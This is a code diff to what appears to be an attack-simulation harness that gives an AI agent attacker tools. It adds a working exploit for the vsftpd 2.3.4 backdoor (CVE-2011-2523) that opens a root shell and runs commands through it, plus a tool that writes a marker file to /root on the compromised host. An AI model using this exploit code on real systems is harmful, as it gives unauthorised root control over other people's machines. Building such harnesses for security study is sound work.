@@ -45,6 +45,7 @@ SESSION = {
     "tried_smb_files": {},
     "decoy_probes_sent": 0,
     "ssh_credentials": {},  # ip -> cracked password, from ssh_bruteforce
+    "ftp_compromised": {},  # ip -> True once vsftpd_backdoor got a real shell
 }
 
 
@@ -245,6 +246,8 @@ def tool_vsftpd_backdoor(params):
         return {"success": False, "summary": f"Trigger sent but shell connection failed: {e}"}
 
     ctrl.close()
+    with LOCK:
+        SESSION["ftp_compromised"][ip] = True
     summary = "; ".join(f"{c['cmd']} -> {c['output']}" for c in commands_run)
     post_event(
         scenario="network-intrusion", actor="attacker", step_id="vsftpd-backdoor-success",
@@ -253,6 +256,111 @@ def tool_vsftpd_backdoor(params):
         reasoning=params.get("reasoning"),
     )
     return {"success": True, "summary": summary, "commands": commands_run}
+
+
+def _vsftpd_exec(ip, commands):
+    """Open a fresh CVE-2011-2523 backdoor shell on `ip` and run `commands`
+    (a list of shell command strings) through it, returning
+    (ok, [{cmd, output}, ...], error_or_None). Same real protocol dance as
+    tool_vsftpd_backdoor -- the backdoor is stateless, so each use re-triggers
+    it rather than holding a socket open across turns."""
+    try:
+        ctrl = socket.create_connection((ip, 21), timeout=8)
+        ctrl.recv(256)
+        ctrl.sendall(b"USER backdoor:)\r\n")
+        ctrl.recv(256)
+        ctrl.sendall(b"PASS x\r\n")
+        ctrl.recv(256)
+    except OSError as e:
+        return False, [], f"Could not reach {ip}:21 -- {e}"
+
+    time.sleep(1.5)  # real: the backdoor listener takes a moment to come up
+    try:
+        shell = socket.create_connection((ip, 6200), timeout=8)
+        shell.settimeout(3)
+        results = []
+        for cmd in commands:
+            shell.sendall((cmd + "\n").encode())
+            time.sleep(0.4)
+            try:
+                out = shell.recv(1000).decode(errors="replace")
+            except socket.timeout:
+                out = ""
+            clean = re.sub(r"/bin/sh: can't access tty; job control turned off\n?", "", out)
+            clean = re.sub(r"/app #\s*", "", clean).strip()
+            results.append({"cmd": cmd, "output": clean})
+        shell.close()
+    except OSError as e:
+        ctrl.close()
+        return False, [], f"Shell connection failed: {e}"
+
+    ctrl.close()
+    return True, results, None
+
+
+def tool_plant_marker(params):
+    """Prove real write access on a host already compromised via the vsftpd
+    backdoor: actually write a marker file onto its real filesystem and read
+    it back. This is the difference between reading data (bad) and being able
+    to alter or destroy it (worse) -- the same root shell that ran whoami
+    could plant ransomware or wipe the disk; this writes one harmless file
+    instead, as proof."""
+    if SESSION["blocked"]:
+        return _blocked_result("plant_marker", params)
+    ip = params.get("ip") or FTP_HOST
+    if not SESSION["ftp_compromised"].get(ip):
+        return {
+            "success": False,
+            "summary": f"No shell on {ip} yet -- run vsftpd_backdoor first to get real access before planting anything.",
+        }
+
+    marker_path = "/root/ATTACKER_WON.txt"
+    marker_text = "ATTACKER WON"
+    # Real write, then a real read-back of the same file as proof it landed --
+    # not a claimed success. Single-quoted heredoc-free echo to keep the
+    # payload a literal string with no shell expansion surprises.
+    ok, results, err = _vsftpd_exec(
+        ip,
+        [f"echo '{marker_text}' > {marker_path}", f"cat {marker_path}"],
+    )
+    if not ok:
+        post_event(
+            scenario="network-intrusion", actor="attacker", step_id="plant-marker-failed",
+            attack_technique_id="T1491.001", severity="low",
+            description=f"Tried to plant a marker file on {ip}, but the shell didn't come up ({err}).",
+            reasoning=params.get("reasoning"),
+        )
+        return {"success": False, "summary": f"Could not plant marker: {err}"}
+
+    readback = next((r["output"] for r in results if r["cmd"].startswith("cat")), "")
+    if marker_text not in readback:
+        post_event(
+            scenario="network-intrusion", actor="attacker", step_id="plant-marker-unconfirmed",
+            attack_technique_id="T1491.001", severity="medium",
+            description=(
+                f"Wrote {marker_path} on {ip} but the read-back didn't confirm it "
+                f"(got: {readback[:120]!r}) -- reporting honestly rather than claiming a win."
+            ),
+            reasoning=params.get("reasoning"),
+        )
+        return {"success": False, "summary": f"Write attempted but not confirmed on read-back: {readback[:200]}"}
+
+    post_event(
+        scenario="network-intrusion", actor="attacker", step_id="plant-marker-success",
+        attack_technique_id="T1491.001", severity="critical", legal_ref="cfaa-1030a2",
+        description=(
+            f"Wrote a real file to {marker_path} on {ip} and read it back to confirm -- "
+            f'"{marker_text}". This is real write access on the target: the same root shell '
+            "could have planted ransomware or destroyed data instead of one harmless marker."
+        ),
+        reasoning=params.get("reasoning"),
+    )
+    return {
+        "success": True,
+        "summary": f'Planted and confirmed {marker_path} on {ip}: "{marker_text}".',
+        "path": marker_path,
+        "readback": readback,
+    }
 
 
 def tool_smb_enum(params):
@@ -547,6 +655,11 @@ TOOLS = {
         "role": "attacker", "handler": tool_vsftpd_backdoor,
         "description": "Trigger the real CVE-2011-2523 vsftpd backdoor on an FTP host and, if it works, run a few real enumeration commands through the resulting shell.",
         "properties": {"ip": {"type": "string", "description": "The FTP host's IP."}},
+    },
+    "plant_marker": {
+        "role": "attacker", "handler": tool_plant_marker,
+        "description": "Prove full control of an FTP host already compromised via vsftpd_backdoor by actually writing a marker file (ATTACKER WON) to its real filesystem and reading it back to confirm. Requires vsftpd_backdoor to have succeeded on this host first. This demonstrates real write access -- the ability to alter or destroy data, not just read it. A strong way to end the run once you've got a shell.",
+        "properties": {"ip": {"type": "string", "description": "The FTP host's IP -- must be one vsftpd_backdoor already compromised."}},
     },
     "smb_enum": {
         "role": "attacker", "handler": tool_smb_enum,
